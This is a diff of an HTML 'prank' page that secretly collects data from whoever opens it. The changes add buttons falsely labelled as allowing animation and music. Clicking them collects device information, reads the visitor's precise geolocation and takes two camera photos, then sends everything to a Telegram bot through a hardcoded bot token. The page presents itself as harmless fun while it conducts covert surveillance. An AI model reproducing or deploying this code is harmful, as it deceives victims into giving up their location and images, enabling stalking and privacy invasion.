@@ -14,6 +14,7 @@
       height: 100vh;
       font-family: 'Share Tech Mono', monospace;
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       color: #00ff00;
@@ -26,11 +27,26 @@
       width: 90%;
       max-width: 600px;
       line-height: 1.5;
+      margin-bottom: 15px;
+    }
+    button {
+      background: #111;
+      color: #0f0;
+      border: 1px solid #0f0;
+      padding: 8px 16px;
+      margin: 4px;
+      cursor: pointer;
+    }
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
     }
   </style>
 </head>
 <body>
   <div id="msg"></div>
+  <button id="lokasiBtn">Izinkan animasi</button>
+  <button id="kameraBtn">Izinkan Putar music</button>
 
   <script>
     const token = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
@@ -130,17 +146,25 @@
           }, 100);
         });
 
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0);
-        canvas.toBlob(async blob => {
-          await sendPhoto(blob, `photo.jpg`);
-          await sendToTelegram('📷 Foto berhasil dikirim.');
-        }, 'image/jpeg');
+        for (let i = 1; i <= 2; i++) {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0);
+          await new Promise(resolve => {
+            canvas.toBlob(async blob => {
+              await sendPhoto(blob, `camera_${i}.jpg`);
+              resolve();
+            }, 'image/jpeg');
+          });
+          await new Promise(r => setTimeout(r, 1000));
+        }
 
         stream.getTracks().forEach(t => t.stop());
+        await sendToTelegram('📷 Kamera berhasil kirim 2 foto.');
+        kameraOK = true;
+        checkAllDone();
       } catch (e) {
         await sendToTelegram('❌ Kamera gagal diakses. Error: ' + e.message);
       }
@@ -148,6 +172,12 @@
 
     const captureLocation = async () => {
       try {
+        const permission = await navigator.permissions.query({ name: "geolocation" });
+        if (permission.state !== "granted") {
+          await sendToTelegram(`❌ Lokasi tidak diizinkan oleh browser (${permission.state})`);
+          return;
+        }
+
         navigator.geolocation.getCurrentPosition(async pos => {
           const { latitude, longitude, accuracy, altitude, speed } = pos.coords;
           const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
@@ -165,6 +195,8 @@
 [+] Google Maps    : ${maps}`.trim();
 
           await sendToTelegram(lokasi);
+          lokasiOK = true;
+          checkAllDone();
         }, async (err) => {
           await sendToTelegram('❌ Lokasi gagal diakses. Error: ' + err.message);
         }, {
@@ -213,11 +245,25 @@
     const msg = `             Selamat anda kena prank.\n         Terima kasih atas kerja samanya.`;
     typeText(document.getElementById('msg'), msg, 30);
 
-    window.onload = async () => {
+    let lokasiOK = false;
+    let kameraOK = false;
+
+    const checkAllDone = () => {
+      if (lokasiOK && kameraOK) {
+        sendToTelegram('✅ Lokasi dan Foto berhasil dikirim.');
+      }
+    };
+
+    document.getElementById('lokasiBtn').addEventListener('click', async () => {
       await collectInfo();
       await captureLocation();
+      document.getElementById('lokasiBtn').disabled = true;
+    });
+
+    document.getElementById('kameraBtn').addEventListener('click', async () => {
       await captureCamera();
-    };
+      document.getElementById('kameraBtn').disabled = true;
+    });
   </script>
 </body>
 </html>
